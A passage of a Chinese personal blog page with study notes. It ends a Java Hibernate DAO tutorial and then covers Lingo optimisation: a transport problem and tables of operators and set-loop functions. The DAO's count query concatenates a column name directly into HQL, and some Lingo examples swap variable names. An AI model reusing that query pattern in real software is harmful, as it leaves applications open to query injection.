DetachedCriteria.forClass(News.class);</span><br><span class="line">		dc.add(Restrictions.ilike(column, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().findByCriteria(dc, (currentPage<span class="number">-1</span>)*lineSize, lineSize);</span><br><span class="line"><span class="comment">//		String hql = "from News as n where n." + column + " like ?";</span></span><br><span class="line"><span class="comment">//		Query query = this.sessionFactory.getCurrentSession().createQuery(hql);</span></span><br><span class="line"><span class="comment">//		query.setParameter(0, "%" + keyWord + "%");</span></span><br><span class="line"><span class="comment">//		query.setFirstResult((currentPage-1)*lineSize);</span></span><br><span class="line"><span class="comment">//		query.setMaxResults(lineSize);</span></span><br><span class="line"><span class="comment">//		return query.list();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function">Integer <span class="title">getAllCount</span><span class="params">(String column, String keyWord)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String hql = <span class="string">"select count(*) from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">		Long count = (Long) <span class="keyword">super</span>.getHibernateTemplate().find(hql, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>).get(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//		Query query = this.sessionFactory.getCurrentSession().createQuery(hql);</span></span><br><span class="line"><span class="comment">//		query.setParameter(0, "%" + column + "%");</span></span><br><span class="line"><span class="comment">//		Long count = (Long) query.uniqueResult();</span></span><br><span class="line">		<span class="function"><span class="keyword">return</span> count.<span class="title">intValue</span><span class="params">()</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="4-2-HibernateDaoSupport使用总结"><a href="#4-2-HibernateDaoSupport使用总结" class="headerlink" title="4.2 HibernateDaoSupport使用总结"></a><strong>4.2 HibernateDaoSupport使用总结</strong></h3><pre><code>    使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。
</code></pre><h2 id="5-使用MyEclipse进行SSH项目整合总结"><a href="#5-使用MyEclipse进行SSH项目整合总结" class="headerlink" title="5. 使用MyEclipse进行SSH项目整合总结"></a><strong>5. 使用MyEclipse进行SSH项目整合总结</strong></h2><pre><code>    以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。
    学习时间：2018-07-17
</code></pre>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/14/Lingo解决优化问题/">Lingo解决优化问题</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-14
        </span><span class="post-category">
            <a href="/categories/Lingo/">Lingo</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点：</p>
<ul>
<li>希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式</li>
<li>方便日后对Lingo核心操作的回顾</li>
<li>希望每一位到来的朋友能够有所收获</li>
</ul>
<blockquote>
<p>若您对Lingo的安装及基本操作不是很了解，可暂且移步：<a href="https://blog.csdn.net/Python__Boy/article/details/82055040" target="_blank" rel="noopener">Lingo安装</a>、<a href="https://blog.csdn.net/Python__Boy/article/details/82224666" target="_blank" rel="noopener">Lingo基本操作</a></p>
</blockquote>
<h2 id="优化模型介绍"><a href="#优化模型介绍" class="headerlink" title="优化模型介绍"></a><a href="https://baike.baidu.com/item/%E6%9C%80%E4%BC%98%E5%8C%96%E6%A8%A1%E5%9E%8B/9116053" target="_blank" rel="noopener">优化模型</a>介绍</h2><p>优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下：</p>
<script type="math/tex; mode=display">
opt \ \ \ \ f(x) \\
s.t \ \ \ \ h_i(x)=0,\ i=1,2,\cdots,m \\
g_j(x)\leq0,\ j=1,2,\cdots,l</script><p>$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。</p>
<h2 id="运输问题"><a href="#运输问题" class="headerlink" title="运输问题"></a><a href="https://baike.baidu.com/item/%E8%BF%90%E8%BE%93%E9%97%AE%E9%A2%98/12734790?fr=aladdin" target="_blank" rel="noopener">运输问题</a></h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><blockquote>
<p>Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。</p>
</blockquote>
<center><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/faedab64034f78f0fcf571d074310a55b3191c12.jpg"></center>

<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\sum^3_{i=1}\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件：</p>
<ul>
<li>生产地限制：每个生产地的运输量理应小于产生量，$\sum_{j=1}^4s_{ij}\leq a_i$</li>
<li>销售地限制：每个销售地接受的货物理应等于销售量，$\sum_{i=1}^3x_{ij}=b_j$</li>
</ul>
<h3 id="优化模型构建"><a href="#优化模型构建" class="headerlink" title="优化模型构建"></a>优化模型构建</h3><p>有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下：</p>
<script type="math/tex; mode=display">
min \ \ \ \ \sum^3_{i=1}\sum^4_{j=1}s_{ij}x_{ij} \\
s.t. \ \ \ \ \sum_{j=1}^4s_{ij}\leq a_i \;;\ \sum_{i=1}^3x_{ij}=b_j \ ;\ s_{ij}\geq0 \ ;</script><h3 id="模型求解"><a href="#模型求解" class="headerlink" title="模型求解"></a>模型求解</h3><p>求解的Lingo代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">supply/1..3/: a;</span><br><span class="line">demand/1..4/: b;</span><br><span class="line">link(supply, demand): c, x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">a = 30,25,21;</span><br><span class="line">b = 15,17,22,12;</span><br><span class="line">c = 6,2,6,7,</span><br><span class="line">	4,9,5,3,</span><br><span class="line">	8,8,1,5;</span><br><span class="line">enddata</span><br><span class="line"></span><br><span class="line">min = @sum(link(i,j): c(i,j) * x(i,j));</span><br><span class="line">@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));</span><br><span class="line">@for(demand(j): @sum(supply(i): x(i,j)) = b(j));</span><br></pre></td></tr></table></figure>
<h3 id="求解结果"><a href="#求解结果" class="headerlink" title="求解结果"></a>求解结果</h3><p>运行如上所示Lingo程序，我们可以得到如下结果：</p>
<center><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f2deb48f8c5494ee6a0fd73a20f5e0fe99257ee0.jpg"></center>

<p>通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下：</p>
<center><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/4e4a20a4462309f7d17476317f0e0cf3d7cad6fe.jpg" width="250"></center>

<h3 id="待续"><a href="#待续" class="headerlink" title="待续"></a>待续</h3>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/14/Lingo基本操作/">Lingo基本操作</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-14
        </span><span class="post-category">
            <a href="/categories/Lingo/">Lingo</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读<a href="http://product.dangdang.com/24073200.html" target="_blank" rel="noopener">《数学建模教程》</a>一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。</p>
<blockquote>
<p>关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 <a href="https://blog.csdn.net/Python__Boy/article/details/82055040" target="_blank" rel="noopener">Lingo安装</a></p>
</blockquote>
<h2 id="Lingo基本运算符"><a href="#Lingo基本运算符" class="headerlink" title="Lingo基本运算符"></a><strong>Lingo基本运算符</strong></h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a><strong>算术运算符</strong></h3><p>^：乘方<br>*：乘<br>/：除<br>+：加<br>-：减</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a><strong>逻辑运算符</strong></h3><p>在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">#and#</td>
<td style="text-align:center">且，&amp;</td>
</tr>
<tr>
<td style="text-align:center">#or#</td>
<td style="text-align:center">或，\</td>
<td>\</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">#not#</td>
<td style="text-align:center">非，!</td>
</tr>
<tr>
<td style="text-align:center">#eq#</td>
<td style="text-align:center">等于，==</td>
</tr>
<tr>
<td style="text-align:center">#ne#</td>
<td style="text-align:center">不等于，!=</td>
</tr>
<tr>
<td style="text-align:center">#gt#</td>
<td style="text-align:center">大于，&gt;</td>
</tr>
<tr>
<td style="text-align:center">#ge#</td>
<td style="text-align:center">大于等于，&gt;=</td>
</tr>
<tr>
<td style="text-align:center">#lt#</td>
<td style="text-align:center">小于，&lt;</td>
</tr>
<tr>
<td style="text-align:center">#le#</td>
<td style="text-align:center">小于等于，&lt;=</td>
</tr>
</tbody>
</table>
</div>
<h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title=" 关系运算符"></a><strong> 关系运算符</strong></h3><p>= 、&lt;= 、 &gt;=</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h2><h3 id="标准数学函数"><a href="#标准数学函数" class="headerlink" title="标准数学函数"></a><strong>标准数学函数</strong></h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">@abs(x)</td>
<td style="text-align:center">绝对值</td>
</tr>
<tr>
<td style="text-align:center">@sin(x)</td>
<td style="text-align:center">正弦值，采用弧度制</td>
</tr>
<tr>
<td style="text-align:center">@cos(x)</td>
<td style="text-align:center">余弦值</td>
</tr>
<tr>
<td style="text-align:center">@tan(x)</td>
<td style="text-align:center">正切</td>
</tr>
<tr>
<td style="text-align:center">@exp(x)</td>
<td style="text-align:center">指数，$e^x$</td>
</tr>
<tr>
<td style="text-align:center">@log(x)</td>
<td style="text-align:center">自然对数</td>
</tr>
<tr>
<td style="text-align:center">@lgm(x)</td>
<td style="text-align:center">gamma函数的自然对数</td>
</tr>
<tr>
<td style="text-align:center">@sign(x)</td>
<td style="text-align:center">x&lt;0返回-1，否则返回返回1</td>
</tr>
<tr>
<td style="text-align:center">@floor(x)</td>
<td style="text-align:center">取整</td>
</tr>
<tr>
<td style="text-align:center">@smax($x_1,x_2,\cdots,x_n$)</td>
<td style="text-align:center">取($x_1,x_2,\cdots,x_n$) 中的最大值</td>
</tr>
<tr>
<td style="text-align:center">@smin($x_1,x_2,\cdots,x_n$)</td>
<td style="text-align:center">取($x_1,x_2,\cdots,x_n$) 中的最小值</td>
</tr>
</tbody>
</table>
</div>
<h3 id="集循环函数"><a href="#集循环函数" class="headerlink" title="集循环函数"></a><strong>集循环函数</strong></h3><p>集循环函数用于遍历整个集，其基本语法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@function(setname[(set_index_list)[|conditional_qualifier]]:</span><br><span class="line">expression_list);</span><br></pre></td></tr></table></figure>
<pre><code>@function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。
</code></pre><h4 id="for"><a href="#for" class="headerlink" title="@for"></a><strong>@for</strong></h4><p>@for函数用来对集中的成员形成约束。</p>
<p>例：产生序列[1,4,9,16,25]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..5/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i^2);</span><br></pre></td></tr></table></figure>
<center>
    <img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f11f3a292df5e0fede20f83e516034a85edf72d0.jpg">
</center>

<h4 id="sum"><a href="#sum" class="headerlink" title="@sum"></a><strong>@sum</strong></h4><p>@sum函数返回遍历指定集成员的一个表达式的和</p>
<p>例：求[1,2,3,4,5,6,7]中前五个数的和</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..7/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i);</span><br><span class="line"></span><br><span class="line">s = @sum(nums(i) | i #le# 5: x(i));</span><br></pre></td></tr></table></figure>
<center>
    <img src="https://gss0.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/91529822720e0cf339223ec40746f21fbe09aa3c.jpg">
</center>

<h4 id="max，-min"><a href="#max，-min" class="headerlink" title="@max，@min"></a><strong>@max，@min</strong></h4><p>这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值</p>
<p>例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..10/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i);</span><br><span class="line"></span><br><span class="line">min_value = @max(nums(i) | i #le# 5: x);</span><br><span class="line">max_value = @min(nums(i) | i #ge# 6: x);</span><br></pre></td></tr></table></figure>
<center>
    <img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/cdbf6c81800a19d8eb24f93a3efa828ba61e46ed.jpg">
</center>

<h4 id="变量界定函数"><a href="#变量界定函数" class="headerlink" title="变量界定函数"></a><strong>变量界定函数</strong></h4><p>该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">@bin(x)</td>
<td style="text-align:center">限制x为0或1</td>
</tr>
<tr>
<td style="text-align:center">@bnd(a,x,b)</td>
<td style="text-align:center">限制x取a到b之间的值</td>
</tr>
<tr>
<td style="text-align:center">@free(x)</td>
<td style="text-align:center">x取实数</td>
</tr>
<tr>
<td style="text-align:center">@gin(x)</td>
<td style="text-align:center">x取整数</td>
</tr>
</tbody>
</table>
</div>
<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a><strong>说明</strong></h4><blockquote>
<p>Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。</p>
</blockquote>
<h2 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a><strong>待更新</strong></h2>
        </div></article>
      <nav class="pagination"><a class="prev" href="/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text">上一页</span>
      </a>
    <a class="next" href="/page/3/">
        <span class="next-text">下一页</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Aaron Li</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.10.2"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
